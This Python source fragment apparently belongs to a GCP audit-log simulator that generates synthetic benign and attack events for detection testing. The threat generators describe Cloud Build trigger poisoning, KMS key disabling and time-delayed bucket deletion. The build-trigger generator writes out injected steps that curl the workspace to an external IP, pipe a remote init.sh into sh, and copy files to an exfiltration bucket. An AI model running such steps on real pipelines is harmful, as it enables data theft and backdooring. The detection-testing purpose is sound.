                "iam.serviceAccounts.actAs",
                "iam.serviceAccountKeys.create",
                "iam.roles.create",
                "iam.serviceAccounts.getAccessToken",
            ],
        },
        {
            "service":    "storage.googleapis.com",
            "res_name":   f"projects/_/buckets/{bucket}",
            "res_type":   "gcs_bucket",
            "res_labels": {"bucket_name": bucket, "project_id": project_id},
            "perms": [
                "storage.buckets.setIamPolicy",
                "storage.buckets.delete",
                "storage.objects.list",
                "storage.objects.get",
            ],
        },
        {
            "service":    "bigquery.googleapis.com",
            "res_name":   f"projects/{project_id}/datasets/{dataset}",
            "res_type":   "bigquery_dataset",
            "res_labels": {"project_id": project_id, "dataset_id": dataset},
            "perms": [
                "bigquery.datasets.update",
                "bigquery.tables.delete",
                "bigquery.tables.getData",
                "bigquery.jobs.create",
            ],
        },
        {
            "service":    "secretmanager.googleapis.com",
            "res_name":   secret_res,
            "res_type":   "audited_resource",
            "res_labels": {"service": "secretmanager.googleapis.com", "project_id": project_id},
            "perms": [
                "secretmanager.versions.access",
                "secretmanager.secrets.update",
                "secretmanager.secrets.delete",
            ],
        },
        {
            "service":    "compute.googleapis.com",
            "res_name":   f"projects/{project_id}",
            "res_type":   "project",
            "res_labels": {"project_id": project_id},
            "perms": [
                "compute.instances.setMetadata",
                "compute.firewalls.create",
                "compute.networks.addPeering",
                "compute.instances.getSerialPortOutput",
            ],
        },
        {
            "service":    "cloudkms.googleapis.com",
            "res_name":   f"projects/{project_id}/locations/global/keyRings",
            "res_type":   "audited_resource",
            "res_labels": {"service": "cloudkms.googleapis.com", "project_id": project_id},
            "perms": [
                "cloudkms.cryptoKeyVersions.destroy",
                "cloudkms.cryptoKeys.setIamPolicy",
                "cloudkms.keyRings.list",
            ],
        },
    ]

    entries = []
    targets = random.choices(recon_pool, k=count)
    for i, target in enumerate(targets):
        granted = [perm for perm in target["perms"] if random.random() < 0.45]
        entry = _build_log_entry(
            project_id      = project_id,
            principal_email = principal['email'],
            caller_ip       = principal['caller_ip'],
            service_name    = target["service"],
            method_name     = "TestIamPermissions",
            resource_name   = target["res_name"],
            resource_type   = target["res_type"],
            resource_labels = target["res_labels"],
            log_type        = _LOG_DATA_ACCESS,
            offset_seconds  = -(count - i) * 3,
            request_body    = {"permissions": target["perms"]},
            response_body   = {"permissions": granted},
        )
        entries.append(entry)
    return entries


def _gen_kms_key_version_disable(config, context=None):
    """
    THREAT: Disable a KMS CryptoKeyVersion (state=DISABLED) — soft crypto destruction.
    Unlike DestroyCryptoKeyVersion there is no 30-day grace period grace window
    but the key can still be re-enabled; however all encrypt/decrypt operations
    immediately fail making CMEK-encrypted data immediately unreadable and hard to
    attribute to sabotage vs misconfiguration.
    service: cloudkms.googleapis.com
    method: google.cloud.kms.v1.KeyManagementService.UpdateCryptoKeyVersion
    resource_type: cloudkms_cryptokey  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    keyring    = _get_random_kms_keyring(config)
    key_name   = _get_random_kms_key(config, keyring)
    version    = str(random.randint(1, 5))
    resource_name = (
        f"projects/{project_id}/locations/{region}"
        f"/keyRings/{keyring}/cryptoKeys/{key_name}/cryptoKeyVersions/{version}"
    )

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudkms.googleapis.com",
        method_name     = "google.cloud.kms.v1.KeyManagementService.UpdateCryptoKeyVersion",
        resource_name   = resource_name,
        resource_type   = "cloudkms_cryptokey",
        resource_labels = {"location": region, "key_ring_id": keyring, "crypto_key_id": key_name},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "cloudkms.cryptoKeyVersions.update",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "cryptoKeyVersion": {
                "name":  resource_name,
                "state": "DISABLED",
            },
            "updateMask": "state",
        },
        response_body = {
            "name":             resource_name,
            "state":            "DISABLED",
            "algorithm":        random.choice([
                "GOOGLE_SYMMETRIC_ENCRYPTION",
                "RSA_DECRYPT_OAEP_4096_SHA256",
                "EC_SIGN_P256_SHA256",
            ]),
            "protectionLevel":  "SOFTWARE",
            "createTime":       _gcp_timestamp(offset_seconds=-86400 * random.randint(30, 180)),
            "generateTime":     _gcp_timestamp(offset_seconds=-86400 * random.randint(30, 180)),
            "destroyEventTime": None,
        },
    )
    return [entry]


def _gen_cloudbuild_trigger_modify(config, context=None):
    """
    THREAT: Modify a Cloud Build trigger to inject a malicious build step — CI/CD
    pipeline poisoning.  The injected step exfiltrates build workspace contents or
    installs a backdoor into the container image before it is pushed to the registry.
    service: cloudbuild.googleapis.com
    method: google.devtools.cloudbuild.v1.CloudBuild.UpdateBuildTrigger
    resource_type: build  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region     = _random_region(config)
    trigger_id = uuid.uuid4().hex[:8]

    gcp_conf     = config.get(CONFIG_KEY, {})
    triggers     = gcp_conf.get('cloudbuild_triggers', [])
    trigger_name = random.choice(triggers) if triggers else random.choice(
        ["deploy-prod", "build-api", "release-pipeline", "docker-push", "ci-main"]
    )

    exfil_ip = _random_external_ip()
    injected_step = random.choice([
        {   # Exfiltrate build workspace (env files, creds)
            "name": "gcr.io/cloud-builders/curl",
            "args": ["-s", "-F",
                     f"data=@/workspace",
                     f"http://{exfil_ip}:8080/upload"],
            "id":   "exfil-workspace",
        },
        {   # Pull and execute remote init script inside the build
            "name": "gcr.io/cloud-builders/docker",
            "args": ["run", "--rm", "-e",
                     f"C2={exfil_ip}:4444",
                     "alpine", "sh", "-c",
                     f"wget -qO- http://{exfil_ip}/init.sh | sh"],
            "id":   "install-backdoor",
        },
        {   # Copy entire workspace to attacker-controlled bucket
            "name": "gcr.io/cloud-builders/gsutil",
            "args": ["cp", "-r", "/workspace",
                     f"gs://build-exfil-{random.randint(1000, 9999)}/dump/"],
            "id":   "exfil-workspace-gcs",
        },
    ])

    resource_name = f"projects/{project_id}/locations/{region}/triggers/{trigger_id}"
    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudbuild.googleapis.com",
        method_name     = "google.devtools.cloudbuild.v1.CloudBuild.UpdateBuildTrigger",
        resource_name   = resource_name,
        resource_type   = "build",
        resource_labels = {"build_trigger_id": trigger_id, "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/{project_id}",
            "permission": "cloudbuild.builds.update",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "projectId": project_id,
            "triggerId": trigger_id,
            "trigger": {
                "name":        trigger_name,
                "description": "Updated build configuration",
                "triggerTemplate": {
                    "repoName":   "app-repo",
                    "branchName": "main",
                },
                "build": {
                    "steps": [
                        {
                            "name": "gcr.io/cloud-builders/docker",
                            "args": ["build", "-t",
                                     f"gcr.io/{project_id}/app:$COMMIT_SHA", "."],
                            "id":   "build-image",
                        },
                        injected_step,
                        {
                            "name": "gcr.io/cloud-builders/docker",
                            "args": ["push", f"gcr.io/{project_id}/app:$COMMIT_SHA"],
                            "id":   "push-image",
                        },
                    ],
                    "images":  [f"gcr.io/{project_id}/app:$COMMIT_SHA"],
                    "timeout": "600s",
                },
            },
        },
    )
    return [entry]


def _gen_gcs_lifecycle_tamper(config, context=None):
    """
    THREAT: Set a GCS bucket lifecycle rule to delete all objects after 1-3 days —
    time-delayed data destruction.  The attacker sets this and walks away; after
    the TTL expires GCS automation silently deletes all objects, destroying logs,
    backups, and evidence without any further attacker action.
    service: storage.googleapis.com  method: storage.buckets.update
    resource_type: gcs_bucket  log_type: ACTIVITY
    """
    p          = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket     = _get_random_gcs_bucket(config)
    ttl_days   = random.choice([1, 1, 1, 2, 3])   # weighted toward 1 day

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "storage.googleapis.com",
        method_name     = "storage.buckets.update",
        resource_name   = f"projects/_/buckets/{bucket}",
        resource_type   = "gcs_bucket",
        resource_labels = {"bucket_name": bucket, "project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   f"projects/_/buckets/{bucket}",
            "permission": "storage.buckets.update",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body = {
            "bucket": bucket,
            "lifecycle": {
                "rule": [
                    {
                        "action":    {"type": "Delete"},
                        "condition": {
                            "age":                ttl_days,
                            "matchesStorageClass": [
                                "STANDARD", "NEARLINE", "COLDLINE", "ARCHIVE",
                            ],
                        },
                    },
                ],
            },
        },
    )
    return [entry]


# ---------------------------------------------------------------------------
# Scenario Dictionaries
# ---------------------------------------------------------------------------

BENIGN_SCENARIOS = {
    _gen_gcs_list_objects:      20,
    _gen_gcs_get_object:        18,
    _gen_gcs_put_object:        10,
    _gen_compute_list_instances: 15,
    _gen_compute_get_instance:   12,
    _gen_iam_get_policy:         8,
    _gen_iam_list_service_accounts: 6,
    _gen_bigquery_list_datasets: 8,
    _gen_bigquery_run_query:     10,
    _gen_gke_list_clusters:      5,
    _gen_cloudrun_list_services: 4,
    _gen_pubsub_list_topics:     4,
    _gen_secret_access:          6,
    _gen_logging_list_sinks:     3,
    _gen_monitoring_list_metrics: 5,
    _gen_dns_list_zones:          3,
    _gen_vertex_list_models:      4,
    _gen_cloudfunctions_invoke:   5,
    # New services (Step 4)
    _gen_cloudsql_list_instances:      6,
    _gen_cloudsql_connect:             4,
    _gen_kms_list_keyrings:            4,
    _gen_kms_encrypt:                  5,
    _gen_artifact_registry_list_repos: 4,
    _gen_cloudbuild_list_builds:       3,
    _gen_cloud_armor_list_policies:    3,
    _gen_spanner_list_instances:       3,
    _gen_dataflow_list_jobs:           2,
    _gen_compute_list_images:          4,
    # Vertex AI benign (Step 8)
    _gen_vertex_predict:             8,
    _gen_vertex_generate_content:    6,
    _gen_vertex_list_training_jobs:  3,
    _gen_vertex_batch_predict:       4,
    # New event types (Step 9)
    _gen_create_service_account:     4,
}

SUSPICIOUS_SCENARIOS = {
    _gen_create_sa_key:          2,  # Could be legitimate SA key rotation
    _gen_iam_get_policy:         1,  # Could be audit / health check
    _gen_gke_exec_pod:           1,  # Could be developer debugging
    _gen_vm_metadata_modify:     1,  # Could be legitimate startup script update
}

THREAT_SCENARIOS = {
    _gen_disable_audit_logging:    3,
    _gen_make_gcs_public:          3,
    _gen_create_sa_key:            4,
    _gen_iam_privilege_escalation: 4,
    _gen_tor_api_access:           2,
    _gen_firewall_expose_all:      3,
    _gen_disable_vpc_flow_logs:    2,
    _gen_gke_exec_pod:             3,
    _gen_snapshot_exfil:           2,
    _gen_secret_mass_access:       3,
    _gen_vertex_dataset_delete:    2,
    _gen_disable_scc:              2,
    _gen_vm_metadata_modify:       3,
    _gen_sa_impersonation:         3,
    _gen_cross_project_sa_grant:   2,
    # New threat scenarios (Step 5)
    _gen_kms_key_destroy:                  2,
    _gen_bigquery_data_exfil:              3,
    _gen_project_delete:                   1,
    _gen_external_user_added:              3,
    _gen_org_policy_modify:                2,
    _gen_cloud_function_malicious_deploy:  2,
    _gen_sql_instance_public:              2,
    _gen_compute_image_exfil:              2,
    _gen_cloud_armor_delete:               2,
    _gen_vpc_peering_backdoor:             2,
    # Vertex AI threats (Step 8)
    _gen_vertex_denial_of_wallet:      3,
    _gen_vertex_model_exfil:           2,
    _gen_vertex_training_malicious:    2,
    _gen_vertex_dataset_poison:        2,
    _gen_vertex_rag_corpus_modify:     2,
    _gen_vertex_tor_predict:           2,
    _gen_vertex_model_armor_delete:    2,
    _gen_vertex_disable_model_logging: 2,
    # New event types (Step 9)
    _gen_vpn_route_create:             3,
    _gen_pubsub_subscription_delete:   2,
    _gen_pubsub_topic_delete:          2,
    _gen_sa_impersonation_failed:      3,
    _gen_admin_role_granted:          15,
    _gen_logging_sink_delete:          1,
    _gen_logging_sink_modify:          1,
    _gen_firewall_rule_delete:         2,
    _gen_cli_from_serverless:         15,
    _gen_functions_sensitive_role:    15,
    _gen_sensitive_role_to_group:     15,
    _gen_iam_deny_policy_create:          15,
    _gen_secretmanager_self_grant:         3,
    _gen_deploymentmanager_self_grant:     3,
    # Detection-targeted generators (round 1)
    _gen_logging_bucket_delete:            3,
    _gen_delete_service_account:           3,
    _gen_gcs_bucket_config_modify:         3,
    _gen_gcs_bucket_delete:                2,
    # Detection-targeted generators (round 2)
    _gen_vpc_network_delete:               2,
    _gen_vpc_route_delete:                 2,
    _gen_iam_role_create:                  3,
    _gen_disable_service_account:          3,
    # Detection-targeted generators (round 3)
    _gen_delete_sa_key:                    4,
    _gen_firewall_rule_modify:             3,
    # New generators — GKE, Cloud Run, Cloud SQL, BigQuery, AR, IAM recon, KMS, CB, GCS
    _gen_gke_privileged_pod_created:       3,
    _gen_gke_cluster_admin_binding:        3,
    _gen_gke_public_endpoint_enabled:      2,
    _gen_cloudrun_public_deploy:           3,
    _gen_cloudsql_export_external:         3,
    _gen_cloudsql_backup_delete:           2,
    _gen_bigquery_table_delete:            2,
    _gen_bigquery_public_dataset:          3,
    _gen_artifact_registry_public:         3,
    _gen_iam_recon_testpermissions:        4,
    _gen_kms_key_version_disable:          3,
    _gen_cloudbuild_trigger_modify:        3,
    _gen_gcs_lifecycle_tamper:             2,
}

SCENARIO_FUNCTIONS = {
    "DISABLE_AUDIT_LOGGING":        _gen_disable_audit_logging,
    "MAKE_GCS_PUBLIC":              _gen_make_gcs_public,
    "CREATE_SA_KEY":                _gen_create_sa_key,
    "IAM_PRIVILEGE_ESCALATION":     _gen_iam_privilege_escalation,
    "TOR_API_ACCESS":               _gen_tor_api_access,
    "FIREWALL_EXPOSE_ALL":          _gen_firewall_expose_all,
    "DISABLE_VPC_FLOW_LOGS":        _gen_disable_vpc_flow_logs,
    "GKE_EXEC_INTO_POD":            _gen_gke_exec_pod,
    "SNAPSHOT_EXFIL":               _gen_snapshot_exfil,
    "SECRET_MASS_ACCESS":           _gen_secret_mass_access,
    "VERTEX_DATASET_DELETE":        _gen_vertex_dataset_delete,
    "DISABLE_SCC":                  _gen_disable_scc,
    "VM_METADATA_MODIFY":           _gen_vm_metadata_modify,
    "SERVICE_ACCOUNT_IMPERSONATION": _gen_sa_impersonation,
    "CROSS_PROJECT_SA_GRANT":       _gen_cross_project_sa_grant,
    # New threat scenarios (Step 5)
    "KMS_KEY_DESTROY":                   _gen_kms_key_destroy,
    "BIGQUERY_DATA_EXFIL":               _gen_bigquery_data_exfil,
    "PROJECT_DELETE":                    _gen_project_delete,
    "EXTERNAL_USER_ADDED":               _gen_external_user_added,
    "ORG_POLICY_MODIFY":                 _gen_org_policy_modify,
    "CLOUD_FUNCTION_MALICIOUS_DEPLOY":   _gen_cloud_function_malicious_deploy,
    "SQL_INSTANCE_PUBLIC":               _gen_sql_instance_public,
    "COMPUTE_IMAGE_EXFIL":               _gen_compute_image_exfil,
    "CLOUD_ARMOR_DELETE":                _gen_cloud_armor_delete,
    "VPC_PEERING_BACKDOOR":              _gen_vpc_peering_backdoor,
    # Vertex AI threats (Step 8)
    "VERTEX_DENIAL_OF_WALLET":       _gen_vertex_denial_of_wallet,
    "VERTEX_MODEL_EXFIL":            _gen_vertex_model_exfil,
    "VERTEX_TRAINING_MALICIOUS":     _gen_vertex_training_malicious,
    "VERTEX_DATASET_POISON":         _gen_vertex_dataset_poison,
    "VERTEX_RAG_CORPUS_MODIFY":      _gen_vertex_rag_corpus_modify,
    "VERTEX_TOR_PREDICT":            _gen_vertex_tor_predict,
    "VERTEX_MODEL_ARMOR_DELETE":     _gen_vertex_model_armor_delete,
    "VERTEX_DISABLE_MODEL_LOGGING":  _gen_vertex_disable_model_logging,
    # New event types (Step 9)
    "VPN_ROUTE_CREATE":              _gen_vpn_route_create,
    "PUBSUB_SUBSCRIPTION_DELETE":    _gen_pubsub_subscription_delete,
    "PUBSUB_TOPIC_DELETE":           _gen_pubsub_topic_delete,
    "SA_IMPERSONATION_FAILED":       _gen_sa_impersonation_failed,
    "ADMIN_ROLE_GRANTED":            _gen_admin_role_granted,
    "LOGGING_SINK_DELETE":           _gen_logging_sink_delete,
    "LOGGING_SINK_MODIFY":           _gen_logging_sink_modify,
    "FIREWALL_RULE_DELETE":          _gen_firewall_rule_delete,
    "CLI_FROM_SERVERLESS":           _gen_cli_from_serverless,
    "FUNCTIONS_SENSITIVE_ROLE":      _gen_functions_sensitive_role,
    "SENSITIVE_ROLE_TO_GROUP":       _gen_sensitive_role_to_group,
    "IAM_DENY_POLICY_CREATE":            _gen_iam_deny_policy_create,
    "SECRETMANAGER_SELF_GRANT":          _gen_secretmanager_self_grant,
    "DEPLOYMENTMANAGER_SELF_GRANT":      _gen_deploymentmanager_self_grant,
    # Detection-targeted generators (round 1)
    "LOGGING_BUCKET_DELETE":             _gen_logging_bucket_delete,
    "DELETE_SERVICE_ACCOUNT":            _gen_delete_service_account,
    "GCS_BUCKET_CONFIG_MODIFY":          _gen_gcs_bucket_config_modify,
    "GCS_BUCKET_DELETE":                 _gen_gcs_bucket_delete,
    # Detection-targeted generators (round 2)
    "VPC_NETWORK_DELETE":                _gen_vpc_network_delete,
    "VPC_ROUTE_DELETE":                  _gen_vpc_route_delete,
    "IAM_ROLE_CREATE":                   _gen_iam_role_create,
    "DISABLE_SERVICE_ACCOUNT":           _gen_disable_service_account,
    # Detection-targeted generators (round 3)
    "DELETE_SA_KEY":                     _gen_delete_sa_key,
    "FIREWALL_RULE_MODIFY":              _gen_firewall_rule_modify,
    # New generators — GKE, Cloud Run, Cloud SQL, BigQuery, AR, IAM recon, KMS, CB, GCS
    "GKE_PRIVILEGED_POD_CREATED":        _gen_gke_privileged_pod_created,
    "GKE_CLUSTER_ADMIN_BINDING":         _gen_gke_cluster_admin_binding,
    "GKE_PUBLIC_ENDPOINT_ENABLED":       _gen_gke_public_endpoint_enabled,
    "CLOUDRUN_PUBLIC_DEPLOY":            _gen_cloudrun_public_deploy,
    "CLOUDSQL_EXPORT_EXTERNAL":          _gen_cloudsql_export_external,
    "CLOUDSQL_BACKUP_DELETE":            _gen_cloudsql_backup_delete,
    "BIGQUERY_TABLE_DELETE":             _gen_bigquery_table_delete,
    "BIGQUERY_PUBLIC_DATASET":           _gen_bigquery_public_dataset,
    "ARTIFACT_REGISTRY_PUBLIC":          _gen_artifact_registry_public,
    "IAM_RECON_TESTPERMISSIONS":         _gen_iam_recon_testpermissions,
    "KMS_KEY_VERSION_DISABLE":           _gen_kms_key_version_disable,
    "CLOUDBUILD_TRIGGER_MODIFY":         _gen_cloudbuild_trigger_modify,
    "GCS_LIFECYCLE_TAMPER":              _gen_gcs_lifecycle_tamper,
}


def get_threat_names():
    """Return available threat names dynamically from SCENARIO_FUNCTIONS.
    Adding a new entry to SCENARIO_FUNCTIONS automatically surfaces it here."""
    return list(SCENARIO_FUNCTIONS.keys())


# ---------------------------------------------------------------------------
# Main Module Function
# ---------------------------------------------------------------------------

last_threat_event_time = 0


def generate_log(config, context=None, threat_level="Benign", benign_only=False, scenario_event=None):
    """
    Generate one or more GCP Cloud Audit Log entries and return them as
    JSON strings ready for Pub/Sub publishing.

    Returns:
        (str, str)       — single LogEntry JSON + event name
        ([str, ...], str) — list of LogEntry JSON strings + event name
                            (for multi-event generators like SECRET_MASS_ACCESS)
        None             — on error / no events generated
    """
    logger = logging.getLogger('simulator.gcp')
    global last_threat_event_time

    entries = None
    chosen_func = None

    # --- Handle named scenario_event ---
    if scenario_event:
        if scenario_event in SCENARIO_FUNCTIONS:
            logger.info("GCP: generating scenario event: %s", scenario_event)
            try:
                result = SCENARIO_FUNCTIONS[scenario_event](config, context)
                if isinstance(result, list) and result:
                    entries = result
                elif result:
                    entries = [result]
                chosen_func = SCENARIO_FUNCTIONS[scenario_event]
            except Exception:
                logger.exception("GCP: scenario generator %s failed", scenario_event)
                return None
        else:
            logger.warning("GCP: unknown scenario_event: %s", scenario_event)
            return None

        if not entries:
            logger.warning("GCP: scenario %s returned no entries", scenario_event)
            return None

    else:
        # --- Normal weighted selection ---
        if context is None:
            context = {}

        if benign_only:
            pool_to_use = BENIGN_SCENARIOS
        elif threat_level == "Insane":
            merged = {}
            for pool in (BENIGN_SCENARIOS, SUSPICIOUS_SCENARIOS, THREAT_SCENARIOS):
                for fn, w in pool.items():
                    merged[fn] = merged.get(fn, 0) + w
            pool_to_use = merged
        else:
            interval = _get_threat_interval(threat_level, config)
            current_time = time.time()
            if interval > 0 and (current_time - last_threat_event_time) > interval:
                last_threat_event_time = current_time
                merged = {}
                for pool in (SUSPICIOUS_SCENARIOS, THREAT_SCENARIOS):
                    for fn, w in pool.items():
                        merged[fn] = merged.get(fn, 0) + w
                pool_to_use = merged
            else:
                pool_to_use = BENIGN_SCENARIOS

        if not pool_to_use:
            return None

        scenario_funcs = list(pool_to_use.keys())
        weights = [max(0.1, float(w)) for w in pool_to_use.values()]

        for attempt in range(5):
            chosen_func = random.choices(scenario_funcs, weights=weights, k=1)[0]
            try:
                result = chosen_func(config, context)
                if isinstance(result, list) and result:
                    entries = result
                    break
                elif result:
                    entries = [result]
                    break
            except Exception:
                logger.exception("GCP: generator %s failed on attempt %d",
                                 getattr(chosen_func, "__name__", "?"), attempt + 1)
                entries = None

    if not entries:
        return None

    _func_to_key = {fn: k for k, fn in SCENARIO_FUNCTIONS.items()}
    event_name = scenario_event if scenario_event else _func_to_key.get(chosen_func, getattr(chosen_func, "__name__", "gcp_event"))

    # Serialize each entry to a JSON string
    try:
        json_strings = [json.dumps(e) for e in entries]
    except Exception:
        logger.exception("GCP: JSON serialization failed")
        return None

    if len(json_strings) == 1:
        return json_strings[0], event_name
    return json_strings, event_name
